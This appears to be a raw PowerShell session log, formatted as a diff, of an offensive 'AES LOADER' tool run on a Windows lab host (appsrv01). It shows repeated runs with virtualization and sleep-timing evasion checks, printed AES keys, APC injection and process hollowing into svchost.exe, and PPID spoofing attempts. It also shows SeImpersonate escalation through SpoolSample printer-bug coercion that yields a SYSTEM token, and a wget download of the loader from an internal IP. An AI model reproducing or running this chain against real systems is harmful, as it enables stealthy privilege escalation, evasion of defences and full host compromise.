@@ -1,0 +1,1255 @@
+PS C:\Windows\Tasks> .\loader.exe -i -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 4107ms
+[+] Sleep timing check passed (4113ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Default mode: spawning C:\Windows\System32\svchost.exe + APC injection...
+[*] With SeImpersonate escalation...
+[*] Generated random pipe name (UUID):
+    95309514-9c0d-49b5-a9fc-c67cb57adf4b
+[*] CreateNamedPipe() details:
+    Pipe name: \\\.\pipe\95309514-9c0d-49b5-a9fc-c67cb57adf4b\pipe\spoolss
+    Access mode: PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
+    Pipe mode: PIPE_TYPE_BYTE | PIPE_WAIT
+    Max instances: 10
+    Buffer sizes: 2048 bytes (in/out)
+[+] CreateNamedPipeW() successful
+    Pipe handle: 0x218
+[+] Named pipe listening...
+[*] Printer bug trigger instructions:
+
+========== RPC COERCION - SPOOLSAMPLE TRIGGER ==========
+Run this command from attacker machine:
+
+SpoolSample.exe appsrv01 appsrv01/pipe/95309514-9c0d-49b5-a9fc-c67cb57adf4b
+
+Details:
+  - Target: appsrv01
+  - Pipe: \\appsrv01\pipe\95309514-9c0d-49b5-a9fc-c67cb57adf4b
+  - Triggers: RpcOpenPrinter() -> RpcRemoteFindFirstPrinterChangeNotificationEx()
+  - spoolsv.exe (SYSTEM) will connect to our named pipe
+  - We impersonate and steal SYSTEM token
+==========================================================
+
+[*] Timeout with jitter: 34903ms
+[*] Waiting for spoolsv.exe connection (timeout: 34903ms)...
+[-] Timeout waiting for pipe connection
+[-] Timeout or error waiting for pipe connection
+[-] spoolsv.exe did not connect within 34903ms
+[-] Escalation FAILED
+PS C:\Windows\Tasks> .\loader.exe -i -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 3197ms
+[+] Sleep timing check passed (3209ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Default mode: spawning C:\Windows\System32\svchost.exe + APC injection...
+[*] With SeImpersonate escalation...
+[*] Generated random pipe name (UUID):
+    06d617e6-a799-4e11-9b4d-02dfcdb403c6
+[*] CreateNamedPipe() details:
+    Pipe name: \\\.\pipe\06d617e6-a799-4e11-9b4d-02dfcdb403c6\pipe\spoolss
+    Access mode: PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
+    Pipe mode: PIPE_TYPE_BYTE | PIPE_WAIT
+    Max instances: 10
+    Buffer sizes: 2048 bytes (in/out)
+[+] CreateNamedPipeW() successful
+    Pipe handle: 0x218
+[+] Named pipe listening...
+[*] Printer bug trigger instructions:
+
+========== RPC COERCION - SPOOLSAMPLE TRIGGER ==========
+Run this command from attacker machine:
+
+SpoolSample.exe appsrv01 appsrv01/pipe/06d617e6-a799-4e11-9b4d-02dfcdb403c6
+
+Details:
+  - Target: appsrv01
+  - Pipe: \\appsrv01\pipe\06d617e6-a799-4e11-9b4d-02dfcdb403c6
+  - Triggers: RpcOpenPrinter() -> RpcRemoteFindFirstPrinterChangeNotificationEx()
+  - spoolsv.exe (SYSTEM) will connect to our named pipe
+  - We impersonate and steal SYSTEM token
+==========================================================
+
+[*] Timeout with jitter: 27343ms
+[*] Waiting for spoolsv.exe connection (timeout: 27343ms)...
+[+] Connection received on named pipe!
+[+] Token impersonated successfully
+[+] Token User SID:
+    S-1-5-18
+[+] Confirmed: SYSTEM (NT AUTHORITY\SYSTEM)
+[+] Escalation successful! Got SYSTEM token
+[+] C:\Windows\System32\svchost.exe spawned: PID 5164
+
+[*] Smart injection - detecting payload type...
+[*] Detected: PE payload
+[*] Parsing PE header...
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[+] Payload EntryPoint: 0x5000
+[*] Opening target process PID 5164...
+[+] Process opened
+[*] Allocating memory...
+[+] Memory allocated at: 0x140000000
+[*] Writing PE headers...
+[*] Writing sections...
+[+] Section written
+[+] Section written
+[+] Section written
+[+] Section written
+[+] Section written
+[*] Creating remote thread at entry point...
+[+] Remote thread created at: 0x140005000
+[+] Thread exit code: 259
+[+] PE injection complete
+[+] SUCCESS
+PS C:\Windows\Tasks> .\loader.exe -i -m hollow -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 4261ms
+[+] Sleep timing check passed (4274ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Hollowing mode (target: C:\Windows\System32\svchost.exe)...
+[*] With SeImpersonate escalation...
+[*] Generated random pipe name (UUID):
+    298140d2-012d-47eb-a25b-205717df016b
+[*] CreateNamedPipe() details:
+    Pipe name: \\\.\pipe\298140d2-012d-47eb-a25b-205717df016b\pipe\spoolss
+    Access mode: PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
+    Pipe mode: PIPE_TYPE_BYTE | PIPE_WAIT
+    Max instances: 10
+    Buffer sizes: 2048 bytes (in/out)
+[+] CreateNamedPipeW() successful
+    Pipe handle: 0x218
+[+] Named pipe listening...
+[*] Printer bug trigger instructions:
+
+========== RPC COERCION - SPOOLSAMPLE TRIGGER ==========
+Run this command from attacker machine:
+
+SpoolSample.exe appsrv01 appsrv01/pipe/298140d2-012d-47eb-a25b-205717df016b
+
+Details:
+  - Target: appsrv01
+  - Pipe: \\appsrv01\pipe\298140d2-012d-47eb-a25b-205717df016b
+  - Triggers: RpcOpenPrinter() -> RpcRemoteFindFirstPrinterChangeNotificationEx()
+  - spoolsv.exe (SYSTEM) will connect to our named pipe
+  - We impersonate and steal SYSTEM token
+==========================================================
+
+[*] Timeout with jitter: 27452ms
+[*] Waiting for spoolsv.exe connection (timeout: 27452ms)...
+[+] Connection received on named pipe!
+[+] Token impersonated successfully
+[+] Token User SID:
+    S-1-5-18
+[+] Confirmed: SYSTEM (NT AUTHORITY\SYSTEM)
+[+] Escalation successful! Got SYSTEM token
+[*] Parsing payload PE header...
+[+] Payload architecture: x64
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[*] Creating suspended process...
+[+] Process created: PID 2376
+[+] Target PEB: 0xafd2f9000
+[+] Target ImageBase: 0x7ff76c660000
+[+] Memory allocated at: 0x140000000
+[*] Writing PE headers...
+[*] Writing sections...
+[+] Section .text written
+[+] Section .rdata written
+[+] Section .data written
+[+] Section .pdata written
+[+] Section .gkec written
+[*] Updating PEB...
+[+] Thread context updated (RCX = 0x140005000)
+[*] Resuming thread...
+[+] Process hollowing complete!
+[+] SUCCESS
+PS C:\Windows\Tasks>
+
+PS C:\Windows\Tasks> wget http://192.168.45.248/files/osep/loader.exe -o loader.exe
+PS C:\Windows\Tasks> .\loader.exe -i -a -m hollow -f scvhost.exe -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 4173ms
+[+] Sleep timing check passed (4182ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Hollowing mode (target: scvhost.exe)...
+[*] With SeImpersonate escalation...
+[*] Generated random pipe name (UUID):
+    bd9db67e-4500-4459-9776-6aa224710c18
+[*] CreateNamedPipe() details:
+    Pipe name: \\\.\pipe\bd9db67e-4500-4459-9776-6aa224710c18\pipe\spoolss
+    Access mode: PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
+    Pipe mode: PIPE_TYPE_BYTE | PIPE_WAIT
+    Max instances: 10
+    Buffer sizes: 2048 bytes (in/out)
+[+] CreateNamedPipeW() successful
+    Pipe handle: 0x218
+[+] Named pipe listening...
+[*] Printer bug trigger instructions:
+
+========== RPC COERCION - SPOOLSAMPLE TRIGGER ==========
+Run this command from attacker machine:
+
+SpoolSample.exe appsrv01 appsrv01/pipe/bd9db67e-4500-4459-9776-6aa224710c18
+
+Details:
+  - Target: appsrv01
+  - Pipe: \\appsrv01\pipe\bd9db67e-4500-4459-9776-6aa224710c18
+  - Triggers: RpcOpenPrinter() -> RpcRemoteFindFirstPrinterChangeNotificationEx()
+  - spoolsv.exe (SYSTEM) will connect to our named pipe
+  - We impersonate and steal SYSTEM token
+==========================================================
+
+[*] Timeout with jitter: 34848ms
+[*] Waiting for spoolsv.exe connection (timeout: 34848ms)...
+[+] Connection received on named pipe!
+[+] Token impersonated successfully
+[+] Token User SID:
+    S-1-5-18
+[+] Confirmed: SYSTEM (NT AUTHORITY\SYSTEM)
+[+] Escalation successful! Got SYSTEM token
+[*] Parsing payload PE header...
+[+] Payload architecture: x64
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[*] Creating suspended process...
+[-] CreateProcessW failed: error 2
+[-] Failed to create suspended process
+[-] FAILED
+PS C:\Windows\Tasks> .\loader.exe -i -a -m hollow -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 4431ms
+[+] Sleep timing check passed (4431ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Hollowing mode (target: C:\Windows\System32\svchost.exe)...
+[*] With SeImpersonate escalation...
+[*] Generated random pipe name (UUID):
+    ae45a6ae-28b5-45a2-8c80-c7d8c38bbb83
+[*] CreateNamedPipe() details:
+    Pipe name: \\\.\pipe\ae45a6ae-28b5-45a2-8c80-c7d8c38bbb83\pipe\spoolss
+    Access mode: PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
+    Pipe mode: PIPE_TYPE_BYTE | PIPE_WAIT
+    Max instances: 10
+    Buffer sizes: 2048 bytes (in/out)
+[+] CreateNamedPipeW() successful
+    Pipe handle: 0x218
+[+] Named pipe listening...
+[*] Printer bug trigger instructions:
+
+========== RPC COERCION - SPOOLSAMPLE TRIGGER ==========
+Run this command from attacker machine:
+
+SpoolSample.exe appsrv01 appsrv01/pipe/ae45a6ae-28b5-45a2-8c80-c7d8c38bbb83
+
+Details:
+  - Target: appsrv01
+  - Pipe: \\appsrv01\pipe\ae45a6ae-28b5-45a2-8c80-c7d8c38bbb83
+  - Triggers: RpcOpenPrinter() -> RpcRemoteFindFirstPrinterChangeNotificationEx()
+  - spoolsv.exe (SYSTEM) will connect to our named pipe
+  - We impersonate and steal SYSTEM token
+==========================================================
+
+[*] Timeout with jitter: 34743ms
+[*] Waiting for spoolsv.exe connection (timeout: 34743ms)...
+[+] Connection received on named pipe!
+[+] Token impersonated successfully
+[+] Token User SID:
+    S-1-5-18
+[+] Confirmed: SYSTEM (NT AUTHORITY\SYSTEM)
+[+] Escalation successful! Got SYSTEM token
+[*] Parsing payload PE header...
+[+] Payload architecture: x64
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[*] Creating suspended process...
+[+] Process created: PID 2920
+[+] Target PEB: 0xfc4b530000
+[+] Target ImageBase: 0x7ff76c660000
+[+] Memory allocated at: 0x140000000
+[*] Writing PE headers...
+[*] Writing sections...
+[+] Section .text written
+[+] Section .rdata written
+[+] Section .data written
+[+] Section .pdata written
+[+] Section .gkec written
+[*] Updating PEB...
+[+] Thread context updated (RCX = 0x140005000)
+[*] Resuming thread...
+[+] Process hollowing complete!
+[+] SUCCESS
+PS C:\Windows\Tasks> .\loader.exe -i -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 3789ms
+[+] Sleep timing check passed (3804ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Default mode: spawning C:\Windows\System32\svchost.exe + APC injection...
+[*] With SeImpersonate escalation...
+[*] Generated random pipe name (UUID):
+    7ce8784a-30ff-4232-9ce9-eccd5dbd34d9
+[*] CreateNamedPipe() details:
+    Pipe name: \\\.\pipe\7ce8784a-30ff-4232-9ce9-eccd5dbd34d9\pipe\spoolss
+    Access mode: PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
+    Pipe mode: PIPE_TYPE_BYTE | PIPE_WAIT
+    Max instances: 10
+    Buffer sizes: 2048 bytes (in/out)
+[+] CreateNamedPipeW() successful
+    Pipe handle: 0x218
+[+] Named pipe listening...
+[*] Printer bug trigger instructions:
+
+========== RPC COERCION - SPOOLSAMPLE TRIGGER ==========
+Run this command from attacker machine:
+
+SpoolSample.exe appsrv01 appsrv01/pipe/7ce8784a-30ff-4232-9ce9-eccd5dbd34d9
+
+Details:
+  - Target: appsrv01
+  - Pipe: \\appsrv01\pipe\7ce8784a-30ff-4232-9ce9-eccd5dbd34d9
+  - Triggers: RpcOpenPrinter() -> RpcRemoteFindFirstPrinterChangeNotificationEx()
+  - spoolsv.exe (SYSTEM) will connect to our named pipe
+  - We impersonate and steal SYSTEM token
+==========================================================
+
+[*] Timeout with jitter: 33423ms
+[*] Waiting for spoolsv.exe connection (timeout: 33423ms)...
+[+] Connection received on named pipe!
+[+] Token impersonated successfully
+[+] Token User SID:
+    S-1-5-18
+[+] Confirmed: SYSTEM (NT AUTHORITY\SYSTEM)
+[+] Escalation successful! Got SYSTEM token
+[+] C:\Windows\System32\svchost.exe spawned: PID 6076
+
+[*] Smart injection - detecting payload type...
+[*] Detected: PE payload
+[*] Parsing PE header...
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[+] Payload EntryPoint: 0x5000
+[*] Opening target process PID 6076...
+[+] Process opened
+[*] Allocating memory...
+[+] Memory allocated at: 0x140000000
+[*] Writing PE headers...
+[*] Writing sections...
+[+] Section written
+[+] Section written
+[+] Section written
+[+] Section written
+[+] Section written
+[*] Creating remote thread at entry point...
+[+] Remote thread created at: 0x140005000
+[+] Thread exit code: 259
+[+] PE injection complete
+[+] SUCCESS
+PS C:\Windows\Tasks> .\loader.exe
+[*] Default mode: spawning C:\Windows\System32\svchost.exe + APC injection...
+[+] SUCCESS
+PS C:\Windows\Tasks> .\loader.exe -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 4438ms
+[+] Sleep timing check passed (4439ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Default mode: spawning C:\Windows\System32\svchost.exe + APC injection...
+[+] C:\Windows\System32\svchost.exe spawned: PID 5392
+
+[*] Smart injection - detecting payload type...
+[*] Detected: PE payload
+[*] Parsing PE header...
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[+] Payload EntryPoint: 0x5000
+[*] Opening target process PID 5392...
+[+] Process opened
+[*] Allocating memory...
+[+] Memory allocated at: 0x140000000
+[*] Writing PE headers...
+[*] Writing sections...
+[+] Section written
+[+] Section written
+[+] Section written
+[+] Section written
+[+] Section written
+[*] Creating remote thread at entry point...
+[+] Remote thread created at: 0x140005000
+[+] Thread exit code: 259
+[+] PE injection complete
+[+] SUCCESS
+PS C:\Windows\Tasks> .\loader.exe --ppid 4 -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 4314ms
+[+] Sleep timing check passed (4316ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Default mode: spawning C:\Windows\System32\svchost.exe + APC injection...
+[*] PPID spoofing enabled (target: 4)...
+[-] OpenProcess (PPID 4) failed: 5
+PS C:\Windows\Tasks> .\loader.exe --ppid 1132 -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 3793ms
+[+] Sleep timing check passed (3795ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Default mode: spawning C:\Windows\System32\svchost.exe + APC injection...
+[*] PPID spoofing enabled (target: 1132)...
+[-] OpenProcess (PPID 1132) failed: 87
+PS C:\Windows\Tasks> .\loader.exe --ppid 1264 -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 3862ms
+[+] Sleep timing check passed (3862ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Default mode: spawning C:\Windows\System32\svchost.exe + APC injection...
+[*] PPID spoofing enabled (target: 1264)...
+[-] OpenProcess (PPID 1264) failed: 5
+PS C:\Windows\Tasks> .\loader.exe -v -m apc -p 1264
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 4050ms
+[+] Sleep timing check passed (4057ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] APC injection mode (PID 1264)...
+
+[*] Smart injection - detecting payload type...
+[*] Detected: PE payload
+[*] Parsing PE header...
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[+] Payload EntryPoint: 0x5000
+[*] Opening target process PID 1264...
+[-] OpenProcess failed: error 5
+[-] FAILED
+PS C:\Windows\Tasks> .\loader.exe -v -m hollow
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 4635ms
+[+] Sleep timing check passed (4649ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Hollowing mode (target: C:\Windows\System32\svchost.exe)...
+[*] Parsing payload PE header...
+[+] Payload architecture: x64
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[*] Creating suspended process...
+[+] Process created: PID 5196
+[+] Target PEB: 0x9db13cf000
+[+] Target ImageBase: 0x7ff76c660000
+[+] Memory allocated at: 0x140000000
+[*] Writing PE headers...
+[*] Writing sections...
+[+] Section .text written
+[+] Section .rdata written
+[+] Section .data written
+[+] Section .pdata written
+[+] Section .gkec written
+[*] Updating PEB...
+[+] Thread context updated (RCX = 0x140005000)
+[*] Resuming thread...
+[+] Process hollowing complete!
+[+] SUCCESS
+PS C:\Windows\Tasks> .\loader.exe -v -m hollow -f svchost.exe --ppid 1264
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 3166ms
+[+] Sleep timing check passed (3168ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Hollowing mode (target: C:\Windows\System32\svchost.exe)...
+[*] PPID spoofing enabled (target: 1264)...
+[*] Parsing payload PE header...
+[+] Payload architecture: x64
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[*] Creating suspended process...
+[*] PPID spoofing enabled (target: 1264)...
+[-] OpenProcess (parent PID 1264) failed: 5
+[-] Failed to create suspended process
+[-] FAILED
+PS C:\Windows\Tasks> .\loader.exe -v -m hollow -f svchost.exe
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 3565ms
+[+] Sleep timing check passed (3573ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Hollowing mode (target: C:\Windows\System32\svchost.exe)...
+[*] Parsing payload PE header...
+[+] Payload architecture: x64
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[*] Creating suspended process...
+[+] Process created: PID 2528
+[+] Target PEB: 0x968e7f4000
+[+] Target ImageBase: 0x7ff76c660000
+[+] Memory allocated at: 0x140000000
+[*] Writing PE headers...
+[*] Writing sections...
+[+] Section .text written
+[+] Section .rdata written
+[+] Section .data written
+[+] Section .pdata written
+[+] Section .gkec written
+[*] Updating PEB...
+[+] Thread context updated (RCX = 0x140005000)
+[*] Resuming thread...
+[+] Process hollowing complete!
+[+] SUCCESS
+PS C:\Windows\Tasks> .\loader.exe -v -m hollow --ppid 1264
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 3078ms
+[+] Sleep timing check passed (3084ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Hollowing mode (target: C:\Windows\System32\svchost.exe)...
+[*] PPID spoofing enabled (target: 1264)...
+[*] Parsing payload PE header...
+[+] Payload architecture: x64
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[*] Creating suspended process...
+[*] PPID spoofing enabled (target: 1264)...
+[-] OpenProcess (parent PID 1264) failed: 5
+[-] Failed to create suspended process
+[-] FAILED
+PS C:\Windows\Tasks> .\loader.exe -i -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 3530ms
+[+] Sleep timing check passed (3540ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Default mode: spawning C:\Windows\System32\svchost.exe + APC injection...
+[*] With SeImpersonate escalation...
+[*] Generated random pipe name (UUID):
+    d86d6e83-347e-46c4-b590-36d18f89f841
+[*] CreateNamedPipe() details:
+    Pipe name: \\\.\pipe\d86d6e83-347e-46c4-b590-36d18f89f841\pipe\spoolss
+    Access mode: PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
+    Pipe mode: PIPE_TYPE_BYTE | PIPE_WAIT
+    Max instances: 10
+    Buffer sizes: 2048 bytes (in/out)
+[+] CreateNamedPipeW() successful
+    Pipe handle: 0x218
+[+] Named pipe listening...
+[*] Printer bug trigger instructions:
+
+========== RPC COERCION - SPOOLSAMPLE TRIGGER ==========
+Run this command from attacker machine:
+
+SpoolSample.exe appsrv01 appsrv01/pipe/d86d6e83-347e-46c4-b590-36d18f89f841
+
+Details:
+  - Target: appsrv01
+  - Pipe: \\appsrv01\pipe\d86d6e83-347e-46c4-b590-36d18f89f841
+  - Triggers: RpcOpenPrinter() -> RpcRemoteFindFirstPrinterChangeNotificationEx()
+  - spoolsv.exe (SYSTEM) will connect to our named pipe
+  - We impersonate and steal SYSTEM token
+==========================================================
+
+[*] Timeout with jitter: 31421ms
+[*] Waiting for spoolsv.exe connection (timeout: 31421ms)...
+[+] Connection received on named pipe!
+[+] Token impersonated successfully
+[+] Token User SID:
+    S-1-5-18
+[+] Confirmed: SYSTEM (NT AUTHORITY\SYSTEM)
+[+] Escalation successful! Got SYSTEM token
+[+] C:\Windows\System32\svchost.exe spawned: PID 5508
+
+[*] Smart injection - detecting payload type...
+[*] Detected: PE payload
+[*] Parsing PE header...
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[+] Payload EntryPoint: 0x5000
+[*] Opening target process PID 5508...
+[+] Process opened
